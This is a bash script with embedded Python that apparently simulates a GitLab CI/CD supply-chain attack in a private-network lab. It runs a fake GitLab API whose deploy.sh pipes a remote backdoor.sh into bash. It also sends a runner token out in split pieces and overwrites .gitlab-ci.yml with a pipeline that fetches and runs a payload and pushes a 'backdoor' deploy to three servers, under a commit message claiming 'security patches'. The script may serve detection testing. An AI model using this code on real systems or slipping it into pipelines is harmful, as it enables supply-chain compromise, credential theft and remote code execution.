#!/bin/bash

echo "GITLAB-CI-CD starting..."

python3 -c "
import http.server
import socketserver
import threading
import time
import json
import subprocess
import base64

class GitLabHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if '/api/v4/projects/1/trigger/pipeline' in self.path:
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{\"id\":12345,\"status\":\"created\",\"ref\":\"master\"}')
        elif '/api/v4/runners/register' in self.path:
            self.send_response(201)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{\"token\":\"runner_auth_token_xyz789\",\"id\":456}')
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        if '/api/v4/projects/1/repository/archive.tar.gz' in self.path:
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-Disposition', 'attachment; filename=\"source-malicious.tar.gz\"')
            self.end_headers()
            self.wfile.write(b'COMPRESSED_MALICIOUS_SOURCE_CODE_WITH_BACKDOOR')
        elif '/api/v4/projects/1/repository/files/deploy.sh/raw' in self.path:
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            deploy_script = '''#!/bin/bash
echo \"Deploying application...\"
curl -s http://172.40.1.200:8080/backdoor.sh | bash
echo \"Deployment complete\"
'''
            self.wfile.write(deploy_script.encode())
        else:
            self.send_response(404)
            self.end_headers()

def start_server():
    with socketserver.TCPServer(('', 8080), GitLabHandler) as httpd:
        httpd.serve_forever()

def advanced_attack():
    time.sleep(12)
    
    branch_name_encoded = base64.b64encode(b'feature-supply-chain-exploit').decode()
    
    subprocess.run(['curl', '-s', '-X', 'POST', 'http://172.40.1.200:8080/webhook/repository_update',
                   '-H', 'Content-Type: application/json',
                   '-H', 'X-GitLab-Event: Push Hook',
                   '-d', f'{{\"ref\":\"refs/heads/{branch_name_encoded}\",\"commits\":[{{\"id\":\"abc123def456\",\"message\":\"Update build configuration\",\"modified\":[\"/.gitlab-ci.yml\",\"/deploy/scripts/build.sh\"]}}]}}'], capture_output=True)
    
    time.sleep(5)
    
    runner_parts = ['GR9876', '5432', '1aBc', 'DeF7', '8901', '23456']
    for i, part in enumerate(runner_parts):
        subprocess.run(['curl', '-s', '-X', 'POST', 'http://172.40.1.200:8080/api/internal/token_validation',
                       '-H', 'Content-Type: application/json',
                       '-H', f'X-Token-Part-{i+1}: {part}',
                       '-d', f'{{\"part\":{i+1},\"total\":6,\"validation\":\"runner_auth\"}}'], capture_output=True)
        time.sleep(1)
    
    malicious_ci = '''
stages:
  - build
  - deploy

build_job:
  stage: build
  script:
    - echo \"Building application...\"
    - curl -s http://172.40.1.200:8080/payload/stage1.sh | bash
    
deploy_production:
  stage: deploy
  script:
    - echo \"Deploying to production...\"
    - for server in 172.40.1.30 172.40.1.31 172.40.1.32; do curl -X POST http://$server:8080/deploy -d '{\"backdoor\":true}'; done
'''
    
    ci_encoded = base64.b64encode(malicious_ci.encode()).decode()
    
    subprocess.run(['curl', '-s', '-X', 'PUT', 'http://172.40.1.20:8080/api/v4/projects/1/repository/files/.gitlab-ci.yml',
                   '-H', 'Content-Type: application/json',
                   '-H', 'Authorization: Bearer Z2xwYXQtMkt4OW1QNG5RN3ZCOHNMMWVSNndaM3VZNXRJOQ==',
                   '-d', f'{{\"branch\":\"feature-supply-chain-exploit\",\"content\":\"{ci_encoded}\",\"commit_message\":\"Update CI configuration for security patches\"}}'], capture_output=True)

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

attack_thread = threading.Thread(target=advanced_attack)
attack_thread.daemon = True
attack_thread.start()

time.sleep(3600)
"
